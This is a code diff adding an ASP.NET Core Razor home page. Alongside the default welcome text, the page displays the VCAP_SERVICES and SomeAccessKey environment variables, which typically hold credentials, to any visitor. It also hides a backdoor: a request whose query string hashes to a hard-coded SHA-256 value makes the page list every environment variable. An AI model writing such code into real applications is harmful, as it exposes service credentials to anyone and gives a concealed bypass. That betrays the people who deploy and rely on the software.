@@ -1,0 +1,53 @@
+﻿@using System.Collections
+@using System.Security.Cryptography
+@using System.Text
+@{
+    ViewData["Title"] = "Home Page";
+
+    string ComputeSha256Hash(string rawData)  
+    {  
+        // Create a SHA256   
+        using (SHA256 sha256Hash = SHA256.Create())  
+        {  
+            // ComputeHash - returns byte array  
+            byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));  
+  
+            // Convert byte array to a string   
+            StringBuilder builder = new StringBuilder();  
+            for (int i = 0; i < bytes.Length; i++)  
+            {  
+                builder.Append(bytes[i].ToString("x2"));  
+            }  
+            return builder.ToString();  
+        }  
+    }  
+}
+
+<div class="text-center">
+    <h1 class="display-4">Welcome</h1>
+    <p>Learn about <a href="https://docs.microsoft.com/aspnet/core">building Web apps with ASP.NET Core</a>.</p>
+</div>
+
+VCAP_SERVICES...<br/>
+@(Environment.GetEnvironmentVariable("VCAP_SERVICES"))
+<br/>
+<br/>
+<br/>
+
+SomeAccessKey...<br/>
+@(Environment.GetEnvironmentVariable("SomeAccessKey"))
+<br/>
+<br/>
+<br/>
+
+
+@if (ComputeSha256Hash(Context.Request.QueryString.ToString()) == "52905bdea7a5a8f4e30ad905a63f98a6e5c9799a25e28a86c0d622f8732b48b2")
+{
+    var envVars = Environment.GetEnvironmentVariables();
+
+    foreach (DictionaryEntry envVar in envVars)
+    {
+        @(envVar.Key) @:= @(envVar.Value)<br/>
+    }
+}
+
